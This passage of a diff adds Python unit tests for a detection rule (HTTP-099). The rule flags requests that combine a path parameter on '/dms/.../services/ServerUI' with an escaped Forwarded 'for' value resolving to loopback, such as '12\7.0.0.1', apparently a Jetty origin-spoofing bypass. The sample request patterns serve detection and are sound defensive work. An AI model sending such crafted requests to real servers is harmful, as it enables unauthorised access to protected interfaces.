+          Q(b"12\\7.0.0.1") is None)
+    check("099 header: the obfuscated identifier form is None",
+          Q(b'"_hidden"') is None)
+    check("099 header: a bare pair of quotes is None", Q(b'""') is None)
+
+
+def test_099_forwarded_node_enumeration():
+    F = hw.forwarded_for_nodes
+    check("099 nodes: one header, one element",
+          F([b'for=1.2.3.4']) == [(0, 0, b"1.2.3.4")])
+    check("099 nodes: comma-separated elements are each read",
+          F([b'for=1.2.3.4, for=5.6.7.8'])
+          == [(0, 0, b"1.2.3.4"), (0, 1, b"5.6.7.8")])
+    check("099 nodes: several header instances are each read",
+          F([b'for=1.2.3.4', b'for=5.6.7.8'])
+          == [(0, 0, b"1.2.3.4"), (1, 0, b"5.6.7.8")])
+    check("099 nodes: the parameter name folds case",
+          F([b'FOR=1.2.3.4']) == [(0, 0, b"1.2.3.4")])
+    check("099 nodes: other parameters in the element are skipped",
+          F([b'proto=https;for="1.2.3.4";host=x'])
+          == [(0, 0, b'"1.2.3.4"')])
+    check("099 nodes: a comma inside a quoted value does not split it",
+          F([b'for="a,b"']) == [(0, 0, b'"a,b"')])
+    check("099 nodes: a semicolon inside a quoted value does not split it",
+          F([b'for="a;b"']) == [(0, 0, b'"a;b"')])
+    check("099 nodes: an escaped quote does not end the string",
+          F([b'for="a\\"b"']) == [(0, 0, b'"a\\"b"')])
+    check("099 nodes: the raw value keeps its quotes and backslashes",
+          F([b'for="12\\7.0.0.1"']) == [(0, 0, b'"12\\7.0.0.1"')])
+    check("099 nodes: a 'by' parameter is not a 'for'",
+          F([b'by="12\\7.0.0.1"']) == [])
+
+
+def test_099_fires_on_both_halves_only():
+    def hit(raw):
+        return _f(raw, "HTTP-099")
+    f = hit(_nc_req(b"/dms;x=1/services/ServerUI", _ESC4))
+    check("099: both halves present is critical",
+          f is not None and f.severity == "critical")
+    check("099: the path segment is reported",
+          f is not None and f.evidence["path_segment"] == "dms")
+    check("099: the path parameter is reported",
+          f is not None and f.evidence["path_parameter"] == "x=1")
+    check("099: the raw for value is reported",
+          f is not None and f.evidence["for_raw"] == '"12\\7.0.0.1"')
+    check("099: the resolved address is reported",
+          f is not None and f.evidence["for_resolved"] == "127.0.0.1")
+    check("099: a loopback resolution is flagged",
+          f is not None and f.evidence["resolves_to_loopback"] is True)
+    f = hit(_nc_req(b"/dms;x=1/services/ServerUI", _ESC6))
+    check("099: the bracketed IPv6 loopback form fires",
+          f is not None and f.evidence["for_resolved"] == "[::1]"
+          and f.evidence["resolves_to_loopback"] is True)
+    check("099: a bare ';' on the dms segment fires",
+          hit(_nc_req(b"/dms;/services/ServerUI", _ESC4)) is not None)
+    check("099: the header name folds case",
+          hit(_nc_req(b"/dms;x=1/services/ServerUI",
+                      b'forwarded: for="12\\7.0.0.1"')) is not None)
+    check("099: an upper-case header name folds too",
+          hit(_nc_req(b"/dms;x=1/services/ServerUI",
+                      b'FORWARDED: for="12\\7.0.0.1"')) is not None)
+    check("099: a non-loopback escape still fires, and is flagged as such",
+          (lambda g: g is not None
+           and g.evidence["resolves_to_loopback"] is False)(
+              hit(_nc_req(b"/dms;x=1/services/ServerUI",
+                          b'Forwarded: for="10.\\1.1.1"'))))
+    # neither half alone
+    check("099: the path half alone is silent",
+          hit(_nc_req(b"/dms;x=1/services/ServerUI")) is None)
+    check("099: the path half with a normal Forwarded is silent",
+          hit(_nc_req(b"/dms;x=1/services/ServerUI",
+                      b"Forwarded: for=192.0.2.9")) is None)
+    check("099: the header half alone is silent",
+          hit(_nc_req(b"/dms/services/ServerUI", _ESC4)) is None)
+    check("099: a normal request is silent",
+          hit(_nc_req(b"/dms/services/ServerUI")) is None)
+
+
+def test_099_position_is_reported_not_required():
+    """Jetty honours the FIRST element; every position is still scanned."""
+    f = _f(_nc_req(b"/dms;x=1/services/ServerUI", _ESC4), "HTTP-099")
+    check("099 position: a first-element hit is marked honoured",
+          f is not None and f.evidence["honoured_by_jetty"] is True
+          and f.evidence["forwarded_instance"] == 0
+          and f.evidence["forwarded_element"] == 0)
+    f = _f(_nc_req(b"/dms;x=1/services/ServerUI",
+                   b"Forwarded: for=1.2.3.4", _ESC4), "HTTP-099")
+    check("099 position: a second header instance still fires",
+          f is not None and f.evidence["forwarded_instance"] == 1)
+    check("099 position: and is marked as one Jetty would not have honoured",
+          f is not None and f.evidence["honoured_by_jetty"] is False)
+    f = _f(_nc_req(b"/dms;x=1/services/ServerUI",
+                   b'Forwarded: for=1.2.3.4, for="12\\7.0.0.1"'), "HTTP-099")
+    check("099 position: a second element in one header still fires",
+          f is not None and f.evidence["forwarded_element"] == 1
+          and f.evidence["honoured_by_jetty"] is False)
+
+
+def test_099_measured_exclusions():
+    def hit(raw):
+        return _f(raw, "HTTP-099")
+    check("099 exclusion: %3B is not matched, measured as unreachable",
+          hit(_nc_req(b"/dms%3Bx=1/services/ServerUI", _ESC4)) is None)
+    check("099 exclusion: X-Forwarded-For is not unescaped, so it is out",
+          hit(_nc_req(b"/dms;x=1/services/ServerUI",
+                      b'X-Forwarded-For: "12\\7.0.0.1"')) is None)
+    check("099 exclusion: a legitimate quoted IPv6 node does not fire",
+          hit(_nc_req(b"/dms;x=1/services/ServerUI",
+                      b'Forwarded: for="[2001:db8::1]:4711"')) is None)
+    check("099 exclusion: for=unknown does not fire",
+          hit(_nc_req(b"/dms;x=1/services/ServerUI",
+                      b"Forwarded: for=unknown")) is None)
+    check("099 exclusion: an obfuscated identifier does not fire",
+          hit(_nc_req(b"/dms;x=1/services/ServerUI",
+                      b'Forwarded: for="_hidden"')) is None)
+    check("099 exclusion: a parameter on a different first segment is out",
+          hit(_nc_req(b"/api;x=1/services/ServerUI", _ESC4)) is None)
+    check("099 exclusion: ;jsessionid= alone does not fire",
+          hit(_nc_req(b"/dms/services/ServerUI;jsessionid=ABC",
+                      _ESC4)) is None)
+
+
+def test_099_loopback_recognition():
+    L = hw._is_loopback_node
+    for good in (b"127.0.0.1", b"127.1.2.3", b"127.0.0.1:8080",
+                 b"[::1]", b"[0:0:0:0:0:0:0:1]"):
+        check(f"099 loopback: {good.decode()} is loopback", L(good))
+    for bad in (b"10.1.1.1", b"192.0.2.9", b"[2001:db8::1]", b"[::2]",
+                b"unknown", b"_hidden", b"", b"[::1", b"128.0.0.1"):
+        check(f"099 loopback: {bad.decode()!r} is not loopback", not L(bad))
+
+
+def test_099_h2c_parity():
+    """HTTP-099 rides :path plus headers, so it gets real h2c coverage."""
+    def h2(target, fwd=()):
+        st = hw.H2ConnectionState("h2nc", synced=True)
+        blk = (_hpack_literal(b":method", b"GET")
+               + _hpack_literal(b":scheme", b"http")
+               + _hpack_literal(b":authority", b"nc.corp")
+               + _hpack_literal(b":path", target))
+        for v in fwd:
+            blk += _hpack_literal(b"forwarded", v)
+        return st.feed([hw.H2Frame(len(blk), hw.FRAME_HEADERS,
+                                   hw.FLAG_END_HEADERS, 1, blk)],
+                       from_client=True, now=1.0)
+    out = h2(b"/dms;x=1/services/ServerUI", [b'for="12\\7.0.0.1"'])
+    check("099 h2c: fires over a decoded header block",
+          "HTTP-099" in codes(out))
+    hit = [f for f in out if f.code == "HTTP-099"]
+    check("099 h2c: the transport is recorded",
+          hit and hit[0].evidence["transport"] == "h2c")
+    check("099 h2c: the IPv6 form fires too",
+          "HTTP-099" in codes(h2(b"/dms;x=1/services/ServerUI",
+                                 [b'for="[::\\1]"'])))
+    check("099 h2c: a clean path is silent",
+          "HTTP-099" not in codes(h2(b"/dms/services/ServerUI",
+                                     [b'for="12\\7.0.0.1"'])))
+    check("099 h2c: no Forwarded is silent",
+          "HTTP-099" not in codes(h2(b"/dms;x=1/services/ServerUI")))
+    check("099 h2c: a legitimate quoted IPv6 node is silent",
+          "HTTP-099" not in codes(h2(b"/dms;x=1/services/ServerUI",
+                                     [b'for="[2001:db8::1]:4711"'])))
 
 
 def test_record_shape():
